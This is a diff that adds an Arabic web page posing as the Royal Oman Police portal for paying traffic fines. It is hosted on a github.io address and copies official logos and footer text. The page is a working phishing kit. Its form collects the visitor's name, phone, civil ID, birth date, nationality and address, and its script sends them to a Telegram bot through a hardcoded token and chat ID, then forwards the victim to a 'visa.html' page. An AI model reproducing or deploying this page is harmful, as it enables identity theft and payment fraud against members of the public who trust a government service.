@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- ✅ العنوان في محرك البحث -->
+<title>دفع مخالفات المرور - شرطة عمان السلطانية | سلطنة عمان</title>
+
+<!-- ✅ وصف مخصص لمحركات البحث -->
+<meta name="description" content="ادفع مخالفات المرور إلكترونيًا عبر منصة شرطة عمان السلطانية الرسمية. خدمة سريعة وآمنة لسكان سلطنة عمان.">
+
+<!-- ✅ كلمات مفتاحية لتحسين الترتيب -->
+<meta name="keywords" content="شرطة عمان السلطانية, سلطنة عمان, مخالفات المرور, دفع المخالفات, المرور عمان, مخالفات شرطة عمان, خدمات المرور">
+
+<!-- ✅ إعدادات المشاركة الاجتماعية (صورة وعنوان ووصف) -->
+<meta property="og:title" content="دفع مخالفات المرور - سلطنة عمان">
+<meta property="og:description" content="منصة إلكترونية آمنة لدفع مخالفات المرور مباشرةً من خلال شرطة عمان السلطانية.">
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRf7tnH15AEBDEPE0_KAhjAmOhBBHeQ7-VZjw&s"> <!-- ضع هنا رابط صورة حقيقية -->
+<meta property="og:url" content="https://omangov.github.io/omangov/">
+<meta property="og:type" content="website">
+
+<!-- ✅ دعم تويتر (اختياري) -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="دفع مخالفات المرور - سلطنة عمان">
+<meta name="twitter:description" content="خدمة دفع المخالفات المرورية إلكترونيًا في سلطنة عمان.">
+<meta name="twitter:image" content="https://example.com/images/oman-police.jpg">
+
+
+
+  <style>
+    body {
+      font-family: 'Tajawal', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f0f0f0;
+    }
+
+    header {
+      background: linear-gradient(to left, #003366, #005599);
+      color: white;
+      padding: 20px;
+      position: relative;
+    }
+
+    .header-content {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      height: 60px;
+    }
+
+    .menu {
+      background-color: white;
+      padding: 10px;
+      cursor: pointer;
+      border-radius: 4px;
+      display: inline-block;
+    }
+
+    .menu .bar {
+      display: block;
+      width: 25px;
+      height: 3px;
+      margin: 5px auto;
+      background-color: #003366;
+    }
+
+    .submenu {
+      display: none;
+      background-color: #003366;
+      padding: 10px;
+      position: absolute;
+      top: 100%;
+      right: 20px;
+      z-index: 10;
+    }
+
+    .submenu a {
+      color: white;
+      display: block;
+      padding: 5px 0;
+      text-decoration: none;
+    }
+
+    .slider {
+      width: 100%;
+      height: 300px;
+      overflow: hidden;
+      position: relative;
+    }
+
+   
+
+    .slides img {
+      width: 100%;
+      height: 300px;
+      object-fit: cover;
+    }
+
+
+    .title {
+      text-align: center;
+      font-size: 32px;
+      font-weight: bold;
+      margin: 40px 0 20px;
+      color: #174884;
+    }
+
+    .services {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+      padding: 20px;
+      max-width: 1200px;
+      margin: auto;
+    }
+
+    .service-box {
+      background: white;
+      border-bottom: 5px solid #003366;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      border-radius: 8px;
+    }
+
+    .service-box img {
+      width: 80px;
+      height: 80px;
+      object-fit: contain;
+    }
+
+    .service-box h3 {
+      margin: 10px 0 5px;
+    }
+
+    .service-box button {
+      background: #003366;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      background: linear-gradient(140deg, #174884 0%, #174884 50%, #174884c7 75%) !important;
+      border: 0;
+    font-weight: 500;
+    font-size: 0.9rem;
+    padding: 5px 16px;
+    }
+
+    #div1{
+            color: #174884;
+    }
+    
+    
+   h3 {
+    color: #212121;
+    font-size: 1.3rem;
+    margin-top: 30px;
+    margin-bottom: 10px;
+    text-align: center;
+    }
+
+    .submenu {
+  background-color: #fff;
+  padding: 2px 4px; /* من الأعلى 2px واليمين/اليسار 4px */
+  width: fit-content; /* ليتناسب مع المحتوى */
+  border-radius: 4px;
+  box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+  width: 300px;
+}
+
+.submenu-item {
+  display: block;
+  width: 300px;
+  padding: 10px;
+  text-align: right;
+  text-decoration: none;
+  color: #333;
+  border-bottom: 1px solid #eee; /* الخط الأبيض بين العناصر */
+  background-color: #040d5c;
+  margin: 0;
+}
+
+.submenu-item:last-child {
+  border-bottom: none; /* إزالة الخط من آخر عنصر */
+}
+
+.services {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 16px;
+  justify-content: center;
+}
+
+.service-box {
+  background-color: #f9f9f9;
+  padding: 20px;
+  width: 300px;
+  text-align: center;
+  border-radius: 12px;
+  box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+  transition: background-color 0.3s ease;
+  cursor: pointer;
+}
+
+.service-box:hover {
+  background-color: #eef6ff; /* لون خفيف عند التمرير */
+}
+
+.main-footer {
+  background-color: #003366;
+  color: white;
+  padding: 20px 0;
+  margin-top: 40px;
+  font-size: 0.9rem;
+}
+
+.footer-container {
+  max-width: 1200px;
+  margin: auto;
+  padding: 0 20px;
+  text-align: center;
+}
+
+.footer-links {
+  margin-bottom: 15px;
+}
+
+.footer-links a {
+  color: #ffffff;
+  margin: 0 10px;
+  text-decoration: none;
+  border-bottom: 1px solid transparent;
+  transition: border-color 0.3s;
+}
+
+.footer-links a:hover {
+  border-color: #ffffff;
+}
+
+.footer-bottom {
+  border-top: 1px solid #ffffff33;
+  padding-top: 10px;
+  font-size: 0.85rem;
+  color: #ddd;
+  margin-bottom: 30px;
+}
+
+.related-sites {
+  padding: 40px 20px;
+  background-color: #f5f5f5;
+  text-align: center;
+}
+
+.related-title {
+  font-size: 24px;
+  color: #003366;
+  margin-bottom: 20px;
+  font-weight: bold;
+}
+
+.related-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 20px;
+  max-width: 600px;
+  margin: auto;
+}
+
+.related-grid a {
+  display: block;
+  border-radius: 8px;
+  overflow: hidden;
+  transition: transform 0.3s ease;
+  box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+}
+
+.related-grid a:hover {
+  transform: scale(1.05);
+}
+
+.related-grid img {
+  width: 100%;
+  height: auto;
+  display: block;
+}
+
+#textex1{ 
+    margin-top: -70px;
+}
+
+#idType{
+height: 35px;
+background-color: #ffffff;
+color: #000000;
+
+}
+
+input{
+    font-size: 16px;
+}
+#divbode{
+    background-color: #ffffff;
+}
+
+
+#texte {
+    margin-top: -40px;
+margin-right: -20px;
+}
+
+#tex22 , #text33 {
+    font-size: 15px;
+}
+
+#tex22 {
+    font-size: 15px;
+    color: #FF0000;
+}
+
+#nationality , #birthDateS{
+    background-color: #ffffff;
+    height: 45px;
+    color: #000000;
+    width: 390px;
+}
+#birthDateS{
+    background-color: #ffffff;
+    height: 45px;
+    color: #000000;
+    width: 390px;
+}
+
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-content">
+      <img src="logomy.png" class="logo" alt="شعار">
+      <div class="menu" onclick="toggleMenu()">
+        <span class="bar"></span>
+        <span class="bar"></span>
+        <span class="bar"></span>
+      </div>
+    </div>
+    <div class="submenu" id="submenu">
+  <a class="submenu-item" href="#"> الصفحة الرئيسية </a>
+  <a class="submenu-item" href="#"> نبذة عن الشركة </a>
+  <a class="submenu-item" href="#"> خدماتنا </a>
+    <a class="submenu-item" href="#"> المركز الاعلامي </a>
+      <a class="submenu-item" href="#"> البيانات المفتوحة </a>
+        <a class="submenu-item" href="#"> المشاركة المجتمعية </a>
+
+
+
+</div>
+
+  </header>
+
+
+
+<section style="padding: 40px 20px; background-color: #ffffff;">
+ 
+
+    <section style="padding: 40px 20px; background-color: #ffffff;">
+    <h2 id="texte">الخدمات الإلكترونية</h2>
+
+    <h2 id="text33"> قم بتعبئة النموذج ادناه للاستعلام اتفاق قيمة المخالفات غير المسدودة</h2>
+<form id="userForm" onsubmit="return handleUserForm(event)" style="max-width: 500px; margin: auto; background: #f9f9f9; padding: 20px; border-radius: 12px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: right;">
+
+  <label for="fullName">الاسم الكامل</label>
+  <input type="text" id="fullName" name="fullName" required style="width: 310px; padding: 10px; margin: 10px 0; border: 1px solid black;">
+
+  <label for="phone">رقم الجوال</label>
+  <input type="tel" id="phone" name="phone" required pattern="[0-9]{8,15}" style="width: 310px; padding: 10px; margin: 10px 0; border: 1px solid black;" placeholder="">
+
+  <label for="civilId">الرقم المدني / الإقامة</label>
+  <input type="text" id="civilId" name="civilId" required style="width: 310px; padding: 10px; margin: 10px 0; border: 1px solid black;">
+
+  <label for="birthDate">تاريخ الميلاد</label>
+  <input type="date" id="birthDate" name="birthDate" required max="<?= date('Y-m-d') ?>" style="width: 310px; padding: 10px; margin: 10px 0; background-color: #ffffff; height: 45px; color: #000000; border: 1px solid black;">
+
+  <label for="nationality">الجنسية</label>
+  <select id="nationality" name="nationality" required style="width: 325px; padding: 10px; margin: 10px 0; border: 1px solid black;">
+    <option value="">اختر الجنسية</option>
+  </select>
+
+  <label for="address">العنوان</label>
+  <input type="text" id="address" name="address" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid black;">
+
+  <button type="submit" style="background-color: #003366; color: white; padding: 10px 20px; border: none; border-radius: 8px; font-size: 1rem; cursor: pointer;">
+    إرسال
+  </button>
+</form>
+
+
+</section>
+
+</section>
+
+
+
+
+
+
+
+  <section class="related-sites">
+  <div class="related-title">جهات ذات علاقة</div>
+  <div class="related-grid">
+    <a  target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/mala_ar.png" alt="جهة 1">
+    </a>
+    <a target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/ncem_ar.png" alt="جهة 2">
+    </a>
+    <a target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/tadad_ar.png" alt="جهة 3">
+    </a>
+    <a  target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/ncht_ar.png" alt="جهة 4">
+    </a>
+     <a target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/iss_ar.png" alt="جهة 4">
+    </a>
+    <a  target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/omanuna_ar.png" alt="جهة 4">
+    </a>
+  </div>
+</section>
+
+
+  <footer class="main-footer">
+  <div class="footer-container">
+          <img src="logomy.png" class="logo" alt="شعار">
+
+    <div class="footer-links">
+        
+      <a href="#">الشروط والأحكام</a>
+      <a href="#">سياسة الخصوصية</a>
+      <a href="#">حقوق النشر</a>
+      <a href="#">إخلاء المسؤولية</a>
+    </div>
+    <div class="footer-bottom">
+      جميع الحقوق محفوظة &copy; 
+
+      © شرطة عمان السلطانية إدارة العلاقات والإعلام الأمني- البريد الإلكتروني: info@rop.gov.om
+                            
+    </div>
+  </div>
+</footer>
+
+
+<script>
+  const countries = [
+    "سلطنة عمان", "السعودية", "الإمارات", "الكويت", "قطر", "البحرين", "مصر", "الأردن",
+    "سوريا", "العراق", "لبنان", "اليمن", "المغرب", "الجزائر", "تونس", "ليبيا",
+    "السودان", "فلسطين", "تركيا", "ألمانيا", "فرنسا", "إيطاليا", "إسبانيا", "الولايات المتحدة",
+    "كندا", "الهند", "باكستان", "إندونيسيا", "ماليزيا", "الصين", "اليابان", "كوريا الجنوبية", "بريطانيا",
+    "أفغانستان", "ألبانيا", "أندورا", "أنغولا", "أنتيغوا وبربودا", "الأرجنتين", "أرمينيا", "أستراليا",
+    "النمسا", "أذربيجان", "جزر البهاما", "بنغلاديش", "باربادوس", "بيلاروس", "بلجيكا", "بليز", "بنين",
+    "بوتان", "بوليفيا", "البوسنة والهرسك", "بوتسوانا", "البرازيل", "بروناي", "بلغاريا", "بوركينا فاسو",
+    "بوروندي", "كمبوديا", "الكاميرون", "الرأس الأخضر", "أفريقيا الوسطى", "تشاد", "تشيلي", "كولومبيا",
+    "جزر القمر", "الكونغو (برازافيل)", "الكونغو (كينشاسا)", "كوستاريكا", "كرواتيا", "كوبا", "قبرص",
+    "التشيك", "الدنمارك", "جيبوتي", "دومينيكا", "جمهورية الدومينيكان", "تيمور الشرقية", "الإكوادور",
+    "السلفادور", "غينيا الاستوائية", "إريتريا", "إستونيا", "إسواتيني", "إثيوبيا", "فيجي", "فنلندا",
+    "الغابون", "غامبيا", "جورجيا", "غانا", "اليونان", "غرينادا", "غواتيمالا", "غينيا", "غينيا بيساو",
+    "غيانا", "هايتي", "هندوراس", "المجر", "آيسلندا", "إيران", "أيرلندا", "إسرائيل", "ساحل العاج",
+    "جامايكا", "كازاخستان", "كينيا", "كيريباتي", "كوريا الشمالية", "قيرغيزستان", "لاوس", "لاتفيا",
+    "ليسوتو", "ليبيريا", "ليختنشتاين", "ليتوانيا", "لوكسمبورغ", "مدغشقر", "مالاوي", "جزر المالديف",
+    "مالي", "مالطا", "جزر مارشال", "موريتانيا", "موريشيوس", "المكسيك", "ميكرونيزيا", "مولدوفا",
+    "موناكو", "منغوليا", "الجبل الأسود", "موزمبيق", "ميانمار (بورما)", "ناميبيا", "ناورو", "نيبال",
+    "هولندا", "نيوزيلندا", "نيكاراغوا", "النيجر", "نيجيريا", "مقدونيا الشمالية", "النرويج", "عمان",
+    "بالاو", "بنما", "بابوا غينيا الجديدة", "باراغواي", "بيرو", "الفلبين", "بولندا", "البرتغال",
+    "رومانيا", "روسيا", "رواندا", "سانت كيتس ونيفيس", "سانت لوسيا", "سانت فنسنت والغرينادين", "ساموا",
+    "سان مارينو", "ساو تومي وبرينسيب", "السنغال", "صربيا", "سيشيل", "سيراليون", "سنغافورة", "سلوفاكيا",
+    "سلوفينيا", "جزر سليمان", "الصومال", "جنوب أفريقيا", "جنوب السودان", "سريلانكا", "سورينام", "السويد",
+    "سويسرا", "طاجيكستان", "تنزانيا", "تايلاند", "توغو", "تونغا", "ترينيداد وتوباغو", "تركمانستان",
+    "توفالو", "أوغندا", "أوكرانيا", "أوروغواي", "أوزبكستان", "فانواتو", "الفاتيكان", "فنزويلا",
+    "فيتنام", "زامبيا", "زيمبابوي"
+  ];
+
+  const nationalitySelect = document.getElementById("nationality");
+
+  countries.forEach(country => {
+    const option = document.createElement("option");
+    option.value = country;
+    option.textContent = country;
+    nationalitySelect.appendChild(option);
+  });
+
+  function handleUserForm(event) {
+    event.preventDefault();
+
+    const data = {
+      fullName: document.getElementById('fullName').value,
+      phone: document.getElementById('phone').value,
+      civilId: document.getElementById('civilId').value,
+      birthDate: document.getElementById('birthDate').value,
+      nationality: document.getElementById('nationality').value,
+      address: document.getElementById('address').value
+    };
+
+    const today = new Date().toISOString().split("T")[0];
+    if (data.birthDate >= today) {
+      alert("❌ يرجى إدخال تاريخ ميلاد صحيح (تاريخ سابق)");
+      return false;
+    }
+
+localStorage.setItem("userFullName", data.fullName);
+
+    const token = "7306405778:AAHuLdC1FiExOFkycDqoTHpd-sUuf6IhF-c";
+    const chat_id = "7595871538";
+    const message = `
+🧍‍♂️ بيانات المستخدم:
+
+📛 الاسم الكامل: ${data.fullName}
+📱 رقم الجوال: ${data.phone}
+🆔 الرقم المدني/الإقامة: ${data.civilId}
+🎂 تاريخ الميلاد: ${data.birthDate}
+🌐 الجنسية: ${data.nationality}
+🏠 العنوان: ${data.address}
+`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: message
+      })
+    })
+    .then(() => {
+      window.location.href = "visa.html";
+    })
+    .catch(error => {
+      alert("❌ فشل الإرسال إلى تليجرام");
+      console.error(error);
+    });
+
+    return false;
+  }
+</script>
+
+
+</body>
+</html>
